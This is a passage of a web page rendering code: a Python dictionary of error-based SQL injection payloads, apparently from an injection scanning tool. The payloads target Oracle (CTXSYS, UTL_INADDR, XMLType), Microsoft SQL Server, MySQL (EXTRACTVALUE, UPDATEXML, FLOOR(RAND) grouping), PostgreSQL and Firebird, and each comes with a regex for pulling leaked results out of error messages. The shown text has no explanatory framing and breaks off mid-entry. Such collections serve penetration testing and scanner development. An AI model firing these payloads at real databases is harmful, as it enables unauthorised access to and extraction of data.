class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line">error_base_injection = &#123;</span><br><span class="line">    'INJPAY_27':</span><br><span class="line">        &#123;'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span><br><span class="line">         'payload': " AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)||<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_26':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)||<span class="string">'[DELIMITER_STOP]'</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_25':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)||<span class="string">'[DELIMITER_STOP]'</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_24':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> [RANDNUM]=(<span class="keyword">SELECT</span> <span class="keyword">UPPER</span>(<span class="keyword">XMLType</span>(<span class="keyword">CHR</span>(<span class="number">60</span>)||<span class="keyword">CHR</span>(<span class="number">58</span>)||<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)||<span class="string">'[DELIMITER_STOP]'</span>||<span class="keyword">CHR</span>(<span class="number">62</span>))) <span class="keyword">FROM</span> DUAL)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_23':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> [RANDNUM]=(<span class="keyword">SELECT</span> <span class="keyword">UPPER</span>(<span class="keyword">XMLType</span>(<span class="keyword">CHR</span>(<span class="number">60</span>)||<span class="keyword">CHR</span>(<span class="number">58</span>)||<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)||<span class="string">'[DELIMITER_STOP]'</span>||<span class="keyword">CHR</span>(<span class="number">62</span>))) <span class="keyword">FROM</span> DUAL)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_22':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> [RANDNUM]=<span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="string">'1'</span> <span class="keyword">ELSE</span> <span class="string">'0'</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_21':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> [RANDNUM]=<span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="string">'1'</span> <span class="keyword">ELSE</span> <span class="string">'0'</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_20':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> [RANDNUM]=<span class="keyword">CONVERT</span>(<span class="built_in">INT</span>,(<span class="keyword">SELECT</span> <span class="string">'[DELIMITER_START]'</span>+(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="string">'1'</span> <span class="keyword">ELSE</span> <span class="string">'0'</span> <span class="keyword">END</span>))+<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_50':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,EXTRACTVALUE([RANDNUM],<span class="keyword">CONCAT</span>(<span class="string">'\\'</span>,<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_29':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH((<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)||<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_28':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)||<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_51':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,UPDATEXML([RANDNUM],<span class="keyword">CONCAT</span>(<span class="string">'.'</span>,<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>),[RANDNUM1])<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_38':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> (UPDATEXML([RANDNUM],<span class="keyword">CONCAT</span>(<span class="string">'.'</span>,<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>),[RANDNUM1]))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_39':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> (EXTRACTVALUE([RANDNUM],<span class="keyword">CONCAT</span>(<span class="string">'\\'</span>,<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>)))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_55':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">WHERE</span> [RANDNUM]=<span class="keyword">CONVERT</span>(<span class="built_in">INT</span>,(<span class="keyword">SELECT</span> <span class="string">'[DELIMITER_START]'</span>+(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="string">'1'</span> <span class="keyword">ELSE</span> <span class="string">'0'</span> <span class="keyword">END</span>))+<span class="string">'[DELIMITER_STOP]'</span>)))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_30':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH((<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)||<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_31':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Firebird', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> [RANDNUM]=(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> [RANDNUM] <span class="keyword">WHEN</span> [RANDNUM] <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span> <span class="keyword">FROM</span> RDB$<span class="keyword">DATABASE</span>)||<span class="string">'[DELIMITER_STOP]'</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_32':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Firebird', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> [RANDNUM]=(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> [RANDNUM] <span class="keyword">WHEN</span> [RANDNUM] <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span> <span class="keyword">FROM</span> RDB$<span class="keyword">DATABASE</span>)||<span class="string">'[DELIMITER_STOP]'</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_33':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">PROCEDURE</span> ANALYSE(EXTRACTVALUE([RANDNUM],<span class="keyword">CONCAT</span>(<span class="string">'\\'</span>,<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>)),<span class="number">1</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_34':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> (<span class="keyword">SELECT</span> <span class="number">2</span>*(<span class="keyword">IF</span>((<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>,<span class="string">'x'</span>))s), <span class="number">8446744073709551610</span>, <span class="number">8446744073709551610</span>)))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_35':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">EXP</span>(~(<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>,<span class="string">'x'</span>))x))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_36':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> JSON_KEYS((<span class="keyword">SELECT</span> <span class="keyword">CONVERT</span>((<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>)) <span class="keyword">USING</span> utf8)))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_37':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> (<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_12':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> <span class="keyword">ROW</span>([RANDNUM],[RANDNUM1])&gt;(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> [RANDNUM2] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM3] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM4] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM5])a <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_13':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> <span class="keyword">ROW</span>([RANDNUM],[RANDNUM1])&gt;(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> [RANDNUM2] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM3] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM4] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM5])a <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_10':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> UPDATEXML([RANDNUM],<span class="keyword">CONCAT</span>(<span class="string">'.'</span>,<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>),[RANDNUM1])<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_11':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> UPDATEXML([RANDNUM],<span class="keyword">CONCAT</span>(<span class="string">'.'</span>,<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>),[RANDNUM1])<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_16':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'PostgreSQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> [RANDNUM]=<span class="keyword">CAST</span>(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>))::<span class="built_in">text</span>||<span class="string">'[DELIMITER_STOP]'</span> <span class="keyword">AS</span> <span class="built_in">NUMERIC</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_17':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> [RANDNUM] <span class="keyword">IN</span> (<span class="keyword">SELECT</span> (<span class="string">'[DELIMITER_START]'</span>+(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="string">'1'</span> <span class="keyword">ELSE</span> <span class="string">'0'</span> <span class="keyword">END</span>))+<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_14':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> <span class="number">1</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>)) <span class="keyword">HAVING</span> <span class="keyword">MIN</span>(<span class="number">0</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_15':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'PostgreSQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> [RANDNUM]=<span class="keyword">CAST</span>(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>))::<span class="built_in">text</span>||<span class="string">'[DELIMITER_STOP]'</span> <span class="keyword">AS</span> <span class="built_in">NUMERIC</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_18':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> [RANDNUM] <span class="keyword">IN</span> (<span class="keyword">SELECT</span> (<span class="string">'[DELIMITER_START]'</span>+(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="string">'1'</span> <span class="keyword">ELSE</span> <span class="string">'0'</span> <span class="keyword">END</span>))+<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_19':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> [RANDNUM]=<span class="keyword">CONVERT</span>(<span class="built_in">INT</span>,(<span class="keyword">SELECT</span> <span class="string">'[DELIMITER_START]'</span>+(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="string">'1'</span> <span class="keyword">ELSE</span> <span class="string">'0'</span> <span class="keyword">END</span>))+<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_52':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">ROW</span>([RANDNUM],[RANDNUM1])&gt;(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> [RANDNUM2] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM3] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM4] <span class="keyword">UNION</span> <span 